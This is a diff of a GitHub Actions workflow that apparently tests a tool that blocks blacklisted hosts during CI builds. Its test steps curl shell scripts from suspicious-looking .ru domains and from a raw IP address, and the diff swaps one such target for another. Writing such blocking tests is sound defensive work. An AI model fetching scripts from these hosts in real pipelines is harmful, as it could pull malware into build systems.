@@ -88,7 +88,7 @@ jobs:
         run: curl https://f3n7k.798u-g.ru/q6a13xi27h.sh
 
       - name: Curl blacklisted host (Custom Builtins) - latest
-        run: curl http://61.163.13.142:40961/bin.sh
+        run: curl https://c8r5q.3-f72v.ru/wie4js1mje.sh
 
       # - name: Install with different checksum
       #   continue-on-error: true
@@ -172,6 +172,7 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY_CB_STAGE }}
           send_job_status: "true"
           debug: "true"
+
 
 
 
